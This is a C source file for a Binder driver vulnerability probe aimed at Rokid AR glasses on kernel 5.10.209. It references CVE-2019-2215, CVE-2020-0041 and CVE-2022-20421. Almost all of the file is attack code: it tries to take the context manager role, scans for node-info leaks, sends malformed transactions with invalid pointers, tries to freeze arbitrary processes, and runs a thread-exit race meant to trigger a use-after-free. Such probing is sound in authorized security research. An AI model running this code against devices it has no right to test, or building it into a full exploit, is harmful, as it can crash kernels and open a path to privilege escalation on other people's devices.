/*
 * binder_probe.c - Binder Driver Vulnerability Probe
 *
 * Target: Rokid AR Glasses (Kernel 5.10.209)
 * /dev/binder, /dev/hwbinder, /dev/vndbinder all world-writable
 *
 * Known Binder CVEs to test:
 * - CVE-2019-2215: Binder UAF (waitqueue race)
 * - CVE-2020-0041: Binder info leak
 * - CVE-2022-20421: Binder UAF
 *
 * Compile:
 * $NDK = "C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865"
 * $CC = "$NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android31-clang.cmd"
 * & $CC -static -O2 -pthread -o binder_probe binder_probe.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>

// Type definitions for binder
typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;

// Binder definitions
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, __u32)
#define BINDER_SET_CONTEXT_MGR _IOW('b', 7, __s32)
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#define BINDER_VERSION _IOWR('b', 9, struct binder_version)
#define BINDER_GET_NODE_INFO_FOR_REF _IOWR('b', 12, struct binder_node_info_for_ref)
#define BINDER_GET_NODE_DEBUG_INFO _IOWR('b', 11, struct binder_node_debug_info)
#define BINDER_FREEZE _IOW('b', 14, struct binder_freeze_info)
#define BINDER_GET_FROZEN_INFO _IOWR('b', 15, struct binder_frozen_status_info)
#define BINDER_ENABLE_ONEWAY_SPAM_DETECTION _IOW('b', 16, __u32)

struct binder_version
{
    __s32 protocol_version;
};

struct binder_write_read
{
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

struct binder_node_debug_info
{
    binder_uintptr_t ptr;
    binder_uintptr_t cookie;
    __u32 has_strong_ref;
    __u32 has_weak_ref;
};

struct binder_node_info_for_ref
{
    __u32 handle;
    __u32 strong_count;
    __u32 weak_count;
    __u32 reserved1;
    __u32 reserved2;
    __u32 reserved3;
};

struct binder_freeze_info
{
    __u32 pid;
    __u32 enable;
    __u32 timeout_ms;
};

struct binder_frozen_status_info
{
    __u32 pid;
    __u32 sync_recv;
    __u32 async_recv;
};

// Binder commands
enum binder_driver_command_protocol
{
    BC_TRANSACTION = 0x40406300,
    BC_REPLY = 0x40406301,
    BC_ACQUIRE_RESULT = 0x40046302,
    BC_FREE_BUFFER = 0x40086303,
    BC_INCREFS = 0x40046304,
    BC_ACQUIRE = 0x40046305,
    BC_RELEASE = 0x40046306,
    BC_DECREFS = 0x40046307,
    BC_INCREFS_DONE = 0x40106308,
    BC_ACQUIRE_DONE = 0x40106309,
    BC_ATTEMPT_ACQUIRE = 0x4008630a,
    BC_REGISTER_LOOPER = 0x0000630b,
    BC_ENTER_LOOPER = 0x0000630c,
    BC_EXIT_LOOPER = 0x0000630d,
    BC_REQUEST_DEATH_NOTIFICATION = 0x4010630e,
    BC_CLEAR_DEATH_NOTIFICATION = 0x4010630f,
    BC_DEAD_BINDER_DONE = 0x40086310,
    BC_TRANSACTION_SG = 0x40486311,
    BC_REPLY_SG = 0x40486312,
};

enum binder_driver_return_protocol
{
    BR_ERROR = 0x80047200,
    BR_OK = 0x00007201,
    BR_TRANSACTION = 0x80407202,
    BR_REPLY = 0x80407203,
    BR_ACQUIRE_RESULT = 0x80047204,
    BR_DEAD_REPLY = 0x00007205,
    BR_TRANSACTION_COMPLETE = 0x00007206,
    BR_INCREFS = 0x80107207,
    BR_ACQUIRE = 0x80107208,
    BR_RELEASE = 0x80107209,
    BR_DECREFS = 0x8010720a,
    BR_ATTEMPT_ACQUIRE = 0x8010720b,
    BR_NOOP = 0x0000720c,
    BR_SPAWN_LOOPER = 0x0000720d,
    BR_FINISHED = 0x0000720e,
    BR_DEAD_BINDER = 0x8008720f,
    BR_CLEAR_DEATH_NOTIFICATION_DONE = 0x80087210,
    BR_FAILED_REPLY = 0x00007211,
    BR_FROZEN_REPLY = 0x00007212,
    BR_ONEWAY_SPAM_SUSPECT = 0x00007213,
};

#define PAGE_SIZE 4096

// Test 1: Basic binder access
int test_basic_binder(const char *path)
{
    printf("\n[TEST] Basic Binder: %s\n", path);
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open(path, O_RDWR | O_CLOEXEC);
    if (fd < 0)
    {
        printf("[-] Cannot open %s: %s\n", path, strerror(errno));
        return -1;
    }
    printf("[+] Opened fd=%d\n", fd);

    // Get version
    struct binder_version ver = {0};
    int ret = ioctl(fd, BINDER_VERSION, &ver);
    if (ret == 0)
    {
        printf("[+] Binder version: %d\n", ver.protocol_version);
    }
    else
    {
        printf("[-] BINDER_VERSION failed: %s\n", strerror(errno));
    }

    // Set max threads
    __u32 max_threads = 16;
    ret = ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);
    printf("[*] BINDER_SET_MAX_THREADS: %s\n", ret == 0 ? "OK" : strerror(errno));

    // mmap the binder region (required for transactions)
    void *map = mmap(NULL, PAGE_SIZE * 16, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
    {
        printf("[-] mmap failed: %s\n", strerror(errno));
    }
    else
    {
        printf("[+] mmap OK: %p\n", map);
        munmap(map, PAGE_SIZE * 16);
    }

    close(fd);
    return 0;
}

// Test 2: Try to become context manager (privileged)
int test_context_manager(void)
{
    printf("\n[TEST] Context Manager Attack\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        return -1;

    // Try to become context manager
    __s32 uid = 0;
    int ret = ioctl(fd, BINDER_SET_CONTEXT_MGR, &uid);
    if (ret == 0)
    {
        printf("[!] BINDER_SET_CONTEXT_MGR succeeded! (Should not happen)\n");
    }
    else
    {
        printf("[*] BINDER_SET_CONTEXT_MGR blocked: %s\n", strerror(errno));
    }

    close(fd);
    return 0;
}

// Test 3: Node info leak (CVE-2020-0041 style)
int test_node_info_leak(void)
{
    printf("\n[TEST] Node Info Leak\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        return -1;

    mmap(NULL, PAGE_SIZE * 16, PROT_READ, MAP_PRIVATE, fd, 0);

    // Try to get node debug info for various handles
    for (__u32 handle = 0; handle < 10; handle++)
    {
        struct binder_node_debug_info info = {0};
        info.ptr = handle;

        int ret = ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &info);
        if (ret == 0 && (info.ptr != 0 || info.cookie != 0))
        {
            printf("[!] Handle %u: ptr=0x%lx cookie=0x%lx strong=%u weak=%u\n",
                   handle, (unsigned long)info.ptr, (unsigned long)info.cookie,
                   info.has_strong_ref, info.has_weak_ref);
        }
    }

    // Try node info for ref
    for (__u32 handle = 0; handle < 10; handle++)
    {
        struct binder_node_info_for_ref info = {0};
        info.handle = handle;

        int ret = ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
        if (ret == 0)
        {
            printf("[*] Ref %u: strong=%u weak=%u\n",
                   handle, info.strong_count, info.weak_count);
        }
    }

    close(fd);
    return 0;
}

// Test 4: Thread exit race (CVE-2019-2215 style)
static int binder_fd = -1;
static volatile int race_done = 0;

static void *thread_exit_racer(void *arg)
{
    (void)arg;

    while (!race_done)
    {
        int ret = ioctl(binder_fd, BINDER_THREAD_EXIT, 0);
        (void)ret;
    }
    return NULL;
}

static void *looper_register(void *arg)
{
    (void)arg;
    char buf[64];

    // Register as looper
    __u32 cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;

    while (!race_done)
    {
        ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        usleep(100);
    }
    return NULL;
}

int test_thread_exit_race(void)
{
    printf("\n[TEST] Thread Exit Race (CVE-2019-2215 style)\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0)
        return -1;

    void *map = mmap(NULL, PAGE_SIZE * 16, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED)
    {
        close(binder_fd);
        return -1;
    }

    printf("[*] Racing BINDER_THREAD_EXIT for 5 seconds...\n");

    pthread_t threads[8];
    for (int i = 0; i < 4; i++)
    {
        pthread_create(&threads[i], NULL, thread_exit_racer, NULL);
    }
    for (int i = 4; i < 8; i++)
    {
        pthread_create(&threads[i], NULL, looper_register, NULL);
    }

    sleep(5);
    race_done = 1;

    for (int i = 0; i < 8; i++)
    {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Race complete - check dmesg\n");

    munmap(map, PAGE_SIZE * 16);
    close(binder_fd);
    binder_fd = -1;
    return 0;
}

// Test 5: Freeze/thaw race
int test_freeze_race(void)
{
    printf("\n[TEST] Freeze/Thaw Race\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        return -1;

    mmap(NULL, PAGE_SIZE * 16, PROT_READ, MAP_PRIVATE, fd, 0);

    // Try to freeze random processes
    struct binder_freeze_info freeze = {0};
    freeze.enable = 1;
    freeze.timeout_ms = 100;

    printf("[*] Attempting to freeze processes...\n");

    for (__u32 pid = 1; pid < 1000; pid += 100)
    {
        freeze.pid = pid;
        int ret = ioctl(fd, BINDER_FREEZE, &freeze);
        if (ret == 0)
        {
            printf("[!] FREEZE pid %u: SUCCESS\n", pid);

            // Try to get frozen status
            struct binder_frozen_status_info status = {0};
            status.pid = pid;
            ioctl(fd, BINDER_GET_FROZEN_INFO, &status);
            printf("    sync_recv=%u async_recv=%u\n", status.sync_recv, status.async_recv);

            // Unfreeze
            freeze.enable = 0;
            ioctl(fd, BINDER_FREEZE, &freeze);
        }
    }

    close(fd);
    return 0;
}

// Test 6: Transaction with malformed data
int test_malformed_transaction(void)
{
    printf("\n[TEST] Malformed Transaction\n");
    printf("="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "="
           "\n");

    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        return -1;

    void *map = mmap(NULL, PAGE_SIZE * 16, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
    {
        close(fd);
        return -1;
    }

    // Try various malformed transactions
    char write_buf[256] = {0};
    char read_buf[256] = {0};

    // BC_FREE_BUFFER with invalid pointer
    __u32 cmd = BC_FREE_BUFFER;
    binder_uintptr_t bad_ptr = 0xdeadbeef;
    memcpy(write_buf, &cmd, 4);
    memcpy(write_buf + 4, &bad_ptr, 8);

    struct binder_write_read bwr = {0};
    bwr.write_size = 12;
    bwr.write_buffer = (binder_uintptr_t)write_buf;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("[*] BC_FREE_BUFFER(0xdeadbeef): %s\n",
           ret == 0 ? "OK" : strerror(errno));

    // BC_INCREFS with bad handle
    cmd = BC_INCREFS;
    __u32 bad_handle = 0xFFFFFFFF;
    memcpy(write_buf, &cmd, 4);
    memcpy(write_buf + 4, &bad_handle, 4);
    bwr.write_size = 8;
    bwr.write_consumed = 0;
    bwr.read_consumed = 0;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("[*] BC_INCREFS(0xFFFFFFFF): %s\n",
           ret == 0 ? "OK" : strerror(errno));

    munmap(map, PAGE_SIZE * 16);
    close(fd);
    return 0;
}

int main(int argc, char *argv[])
{
    printf("==========================================\n");
    printf("    Binder Vulnerability Probe v1.0       \n");
    printf("    Target: Kernel 5.10.209               \n");
    printf("==========================================\n");

    printf("\n[*] PID: %d, UID: %d\n", getpid(), getuid());

    // Test all binder devices
    test_basic_binder("/dev/binder");
    test_basic_binder("/dev/hwbinder");
    test_basic_binder("/dev/vndbinder");

    // Run exploit tests
    test_context_manager();
    test_node_info_leak();
    test_malformed_transaction();
    test_freeze_race();

    if (argc > 1 && strcmp(argv[1], "--race") == 0)
    {
        test_thread_exit_race();
    }
    else
    {
        printf("\n[*] Run with --race for thread exit race test\n");
    }

    printf("\n==========================================\n");
    printf("    Probe Complete                         \n");
    printf("    Check 'dmesg' for kernel messages      \n");
    printf("==========================================\n");

    return 0;
}
